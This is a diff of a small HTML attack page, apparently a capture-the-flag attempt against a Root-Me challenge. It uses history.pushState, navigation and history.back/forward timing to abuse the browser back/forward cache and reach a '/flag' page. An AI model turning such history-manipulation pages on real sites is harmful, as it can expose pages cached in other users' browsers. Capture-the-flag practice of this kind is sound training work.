@@ -3,25 +3,16 @@
 <head>
   <meta charset="utf-8">
   <script>
-    window.addEventListener('load', () => {
 
-      setTimeout(() => {
-        location.href = 'http://challenge01.root-me.org:58007/flag';
-      }, 400);
-      
+    history.pushState({}, '', 'http://challenge01.root-me.org:58007/flag');
+    
 
-      setTimeout(() => {
-        history.back();
-      }, 1200);
-
-      
-      setTimeout(() => {
-        history.forward();
-      }, 1600);
-    });
+    setTimeout(() => {
+      history.back();
+    }, 100);
   </script>
 </head>
-<body style="background:black;color:white;font-size:40px;">
-  <h1>BFCACHE FLAG</h1>
+<body style="background:black;color:lime;font-size:40px;">
+  <h1>🚀 FLAG NOW</h1>
 </body>
 </html>
